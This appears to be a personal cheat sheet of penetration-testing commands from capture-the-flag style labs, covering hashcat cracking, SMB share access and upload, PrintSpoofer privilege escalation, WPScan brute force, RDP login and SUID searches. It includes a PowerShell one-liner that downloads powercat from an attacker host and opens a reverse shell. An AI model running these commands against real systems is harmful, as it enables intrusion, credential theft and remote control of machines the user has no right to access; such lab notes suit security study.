Hashcat command
hashcat -m 1710 -a 0 salt /usr/share/wordlists/rockyou.txt
1710 - https://hashcat.net/wiki/doku.php?id=example_hashes, search here and choose the number suitable for your hash
salt - ur hash file

SMB shares command
smbclient -L ipaddress

SMB connect command
smbclient \\\\10.10.x.x\\nt4wrksv
10.10.x.x- ip-address
nt4wrksv - network share name

SMB Share file put
After connecting to file sharing network, use the following command
put hello.txt
hello.txt = any file 
http://10.10.157.157:49663/nt4wrksv/hello.txt
after inseting this into web, should launch the text file.

PrintSpoofer - works window 10 vulnerability 
Printspoofer command to use for priviledge escalation
PrintSpoofer.exe -i -c cmd

WP Scan - used for scanning vulnerabilities in webpage created by wordpress
  Command to use for enumeration
  wpscan --url http://10.10.67.25/blog -e vp,u
  -e = enumerate
  vp = vulnerable plugins
  u = users

  Command to crack password
  wpscan --url http://10.10.67.25/blog --usernames admin --passwords /root/Desktop/rockyou.txt

Command to find files
find / -name *.txt 
.txt = any extensions

Connecting Window Machine Using RDP
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.73.95 /workarea

Using powershell to download
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"
To stabalise shell to get into cmd
python -c 'import pty;pty.spawn("/bin/bash")'

Finding all files with SUID
find / -perm -u=s -type f 2>/dev/null

